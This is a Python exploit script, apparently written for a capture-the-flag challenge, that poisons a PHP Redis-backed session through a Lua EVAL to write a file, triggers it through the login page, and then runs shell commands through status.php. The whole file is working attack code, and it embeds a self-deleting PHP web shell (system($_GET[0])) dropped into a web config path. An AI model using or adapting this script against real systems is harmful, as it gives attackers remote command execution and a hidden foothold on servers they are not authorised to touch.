#!/usr/bin/env python3
import sys, ssl, http.client
import gen_payload
import redis_ctl

HOST = "eci-2zean9adh9n9jct6jz9y.cloudeci1.ichunqiu.com"
PORT = 443
SID = "QWBTESTCOOKIE1234567890ABCDEF"
SESSION_NAME = "ocq6ontx14as"
KEY = "PHPREDIS_SESSION:" + SID
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

CODE = "<?php $CONFIG=[]; if(isset($_GET[0])){ system($_GET[0]); } @unlink(__FILE__); ?>"


def set_payload(filename, code=CODE, name=None):
    payload = gen_payload.build(filename, code, name if name is not None else code)
    script = gen_payload.to_lua(payload)
    reply = redis_ctl.redis(6379, "EVAL", script, "1", KEY, print_reply=False)
    print("inject %s -> %r" % (filename, reply))


def request(path, follow=False):
    conn = http.client.HTTPSConnection(HOST, PORT, context=CTX, timeout=30)
    conn.request(
        "GET",
        path,
        headers={
            "Cookie": "%s=%s" % (SESSION_NAME, SID),
            "User-Agent": "Mozilla/5.0 qwb2026",
        },
    )
    resp = conn.getresponse()
    body = resp.read()
    print("GET %s -> %s bytes=%d" % (path, resp.status, len(body)))
    print("body_head=%r" % (body[:400],))
    conn.close()
    return resp.status, body


def trigger():
    conn = http.client.HTTPSConnection(HOST, PORT, context=CTX, timeout=30)
    conn.request(
        "GET",
        "/index.php/login",
        headers={
            "Cookie": "%s=%s" % (SESSION_NAME, SID),
            "User-Agent": "Mozilla/5.0 qwb2026",
        },
    )
    resp = conn.getresponse()
    body = resp.read()
    print("trigger -> %s bytes=%d" % (resp.status, len(body)))
    conn.close()


if __name__ == "__main__":
    filename = sys.argv[1] if len(sys.argv) > 1 else "/var/www/html/config/qwb.config.php"
    cmd = sys.argv[2] if len(sys.argv) > 2 else "echo QWB_CFG_OK"
    set_payload(filename)
    trigger()
    request("/status.php?0=" + cmd.replace(" ", "+"))
    request("/status.php")
